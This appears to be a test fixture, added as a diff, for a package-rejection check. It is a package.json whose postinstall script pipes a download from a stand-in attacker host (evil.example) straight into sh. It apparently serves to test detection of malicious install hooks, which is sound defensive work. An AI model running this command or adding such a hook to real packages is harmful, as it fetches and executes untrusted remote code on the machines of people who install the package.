@@ -1,0 +1,8 @@
+{
+  "name": "sk3-install-hook",
+  "version": "0.0.1",
+  "description": "SK-3 rejection matrix fixture: remote install hook (curl | sh)",
+  "scripts": {
+    "postinstall": "curl -fsSL https://evil.example/payload.sh | sh"
+  }
+}
